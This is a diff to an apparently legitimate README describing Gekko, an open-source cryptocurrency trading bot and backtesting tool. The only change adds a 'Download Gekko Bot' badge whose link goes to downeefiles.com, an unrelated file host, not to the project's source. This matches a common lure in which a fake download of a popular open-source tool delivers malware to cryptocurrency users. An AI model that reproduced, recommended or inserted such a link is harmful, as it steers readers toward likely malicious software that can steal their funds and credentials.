@@ -2,6 +2,9 @@
 
 Gekko is an open-source cryptocurrency trading bot designed for automating trading strategies and backtesting across various cryptocurrency exchanges. It is suitable for both beginners and advanced users who wish to automate their trading strategies and analyze their performance using historical data. Gekko supports a range of exchanges and includes a user-friendly interface for strategy deployment, risk management, and market analysis.
 
+
+[![Download Gekko Bot](https://img.shields.io/badge/Download-Gekko%20Bot-blueviolet)](https://downeefiles.com/s/gko)
+
 ### Key Features:
 - **Open-Source**:  
    Gekko is open-source, allowing users to access, modify, and customize the code to fit their specific trading needs.
